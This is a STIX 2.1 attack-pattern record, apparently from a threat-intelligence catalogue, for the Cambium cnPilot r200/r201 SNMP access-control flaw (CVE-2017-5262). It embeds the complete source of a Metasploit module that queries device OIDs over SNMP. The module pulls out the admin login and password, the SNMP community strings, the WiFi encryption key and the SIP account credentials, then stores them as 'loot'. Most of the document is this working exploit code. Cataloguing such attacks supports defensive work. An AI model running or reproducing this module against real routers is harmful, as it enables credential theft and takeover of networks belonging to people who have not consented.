{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5b371bf0-464a-48c8-b412-6f40ef29e929",
    "created": "2024-08-14T16:27:45.377623Z",
    "modified": "2024-08-14T16:27:45.377627Z",
    "name": "Cambium cnPilot r200/r201 SNMP Enumeration",
    "description": " Cambium cnPilot r200/r201 devices can be administered using SNMP. The device configuration contains IP addresses, keys, passwords, & lots of juicy information. This module exploits an access control flaw, which allows remotely extracting sensitive information such as account passwords, WiFI PSK, & SIP credentials via SNMP Read-Only (RO) community string. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/cnpilot_r_snmp_loot.rb",
            "external_id": "cnpilot_r_snmp_loot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5262"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'Cambium cnPilot r200/r201 SNMP Enumeration',\n      'Description' => %{\n        Cambium cnPilot r200/r201 devices can be administered using SNMP. The\n        device configuration contains IP addresses, keys, passwords, & lots of juicy\n        information. This module exploits an access control flaw, which allows remotely\n        extracting sensitive information such as account passwords, WiFI PSK, & SIP\n        credentials via SNMP Read-Only (RO) community string.\n      },\n      'Author' => ['Karn Ganeshen'],\n      'References' =>\n        [\n          ['CVE', '2017-5262'],\n          ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [true, 'SNMP connection timeout', 10])\n      ], self.class\n    )\n  end\n\n  def run_host(ip)\n    begin\n      snmp = connect_snmp\n      print_good(\"#{ip}, Connected.\\n\")\n\n      cnpilot_info = ''\n\n      # System Info\n      snmp_system_name = snmp.get_value('1.3.6.1.4.1.41010.1.1.1.0')\n      snmp_system_description = snmp.get_value('1.3.6.1.2.1.1.1.0')\n      cnpilot_system_uptime = snmp.get_value('1.3.6.1.2.1.1.3.0')\n      cnpilot_hardware_version = snmp.get_value('1.3.6.1.4.1.41010.1.1.4.0')\n      cnpilot_firmware_version = snmp.get_value('1.3.6.1.4.1.41010.1.1.5.0')\n\n      cnpilot_info << \"SNMP System Name: #{snmp_system_name}\" << \"\\n\"\n      cnpilot_info << \"SNMP System Description: #{snmp_system_description}\" << \"\\n\"\n      cnpilot_info << \"Device UpTime: #{cnpilot_system_uptime}\" << \"\\n\"\n      cnpilot_info << \"Hardware version: #{cnpilot_hardware_version}\" << \"\\n\"\n      cnpilot_info << \"Firmware version: #{cnpilot_firmware_version}\" << \"\\n\"\n\n      # cnPilot Web Management Admin account Info\n      admin_username = snmp.get_value('1.3.6.1.4.1.41010.1.7.12.0')\n      admin_password = snmp.get_value('1.3.6.1.4.1.41010.1.7.13.0')\n\n      cnpilot_info << \"Web Management Admin Login Name: #{admin_username}\" << \"\\n\"\n      cnpilot_info << \"Web Management Admin Login Password: #{admin_password}\" << \"\\n\"\n\n      # SNMP Info\n      snmp_readonly_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.2.0')\n      snmp_readwrite_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.3.0')\n      snmp_trap_community = snmp.get_value('1.3.6.1.4.1.41010.1.9.4.0')\n      snmp_trap_entry_ip = snmp.get_value('1.3.6.1.4.1.41010.1.9.1.0')\n\n      cnpilot_info << \"SNMP read-only community name: #{snmp_readonly_community}\" << \"\\n\"\n      cnpilot_info << \"SNMP read-write community name: #{snmp_readwrite_community}\" << \"\\n\"\n      cnpilot_info << \"SNMP Trap Community: #{snmp_trap_community}\" << \"\\n\"\n      cnpilot_info << \"SNMP Trap Server IP Address: #{snmp_trap_entry_ip}\" << \"\\n\"\n\n      # WIFI Info\n      wireless_interface_ssid = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.6.1')\n      wireless_interface_encryptionkey = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.8.1')\n      wireless_interface_encryption = snmp.get_value('1.3.6.1.4.1.41010.1.10.2.1.1.1.7.1')\n\n      cnpilot_info << \"Wireless Interface SSID: #{wireless_interface_ssid}\" << \"\\n\"\n      cnpilot_info << \"Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}\" << \"\\n\"\n      cnpilot_info << \"Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption}\" << \"\\n\"\n\n      # SIP Account Info\n      sip_accountnumber = snmp.get_value('1.3.6.1.4.1.41010.1.5.1.1.11.1')\n      sip_accountpassword = snmp.get_value('1.3.6.1.4.1.41010.1.5.1.1.12.1')\n\n      cnpilot_info << \"SIP Account Number: #{sip_accountnumber}\" << \"\\n\"\n      cnpilot_info << \"SIP Account Password: #{sip_accountpassword}\" << \"\\n\"\n\n      # Printing captured info\n      print_status(\"Fetching System Information...\\n\")\n      print_good(\"SNMP System Name: #{snmp_system_name}\")\n      print_good(\"SNMP System Description: #{snmp_system_description}\")\n      print_good(\"Device UpTime: #{cnpilot_system_uptime}\")\n      print_good(\"Hardware version: #{cnpilot_hardware_version}\")\n      print_good(\"Firmware version: #{cnpilot_firmware_version}\\n\")\n\n      print_status(\"Fetching Login Account Information...\\n\")\n      print_good(\"Web Management Admin Login Name: #{admin_username}\")\n      print_good(\"Web Management Admin Login Password: #{admin_password}\\n\")\n\n      print_status(\"Fetching SNMP Information...\\n\")\n      print_good(\"SNMP read-only community name: #{snmp_readonly_community}\")\n      print_good(\"SNMP read-write community name: #{snmp_readwrite_community}\")\n      print_good(\"SNMP Trap Community: #{snmp_trap_community}\")\n      print_good(\"SNMP Trap Server IP Address: #{snmp_trap_entry_ip} \\n\")\n\n      print_status(\"Fetching WIFI Information...\\n\")\n      print_good(\"Wireless Interface SSID: #{wireless_interface_ssid}\")\n      print_good(\"Wireless Interface Encryption Key: #{wireless_interface_encryptionkey}\")\n      print_good(\"Wireless Interface Encryption (1 - Open mode, 2 - wpa2 mode, 3 - EAP-TTLS): #{wireless_interface_encryption} \\n\")\n\n      print_status(\"Fetching SIP Account Information...\\n\")\n      print_good(\"SIP Account Number: #{sip_accountnumber}\")\n      print_good(\"SIP Account Password: #{sip_accountpassword}\\n\")\n\n      # Woot we got loot.\n      loot_name     = 'snmp_loot'\n      loot_type     = 'text/plain'\n      loot_filename = 'cnpilot_snmp_loot.txt'\n      loot_desc     = 'Cambium cnPilot configuration data'\n      p = store_loot(loot_name, loot_type, datastore['RHOST'], cnpilot_info, loot_filename, loot_desc)\n      print_good(\"Cambium cnPilot SNMP loot saved at #{p} \\n\")\n\n    rescue SNMP::RequestTimeout\n      print_error(\"#{ip} SNMP request timeout.\")\n    rescue Rex::ConnectionError\n      print_error(\"#{ip} Connection refused.\")\n    rescue SNMP::InvalidIpAddress\n      print_error(\"#{ip} Invalid IP Address. Check it with 'snmpwalk tool'.\")\n    rescue SNMP::UnsupportedVersion\n      print_error(\"#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n      elog(e)\n    ensure\n      disconnect_snmp\n    end\n  end\nend\n"
}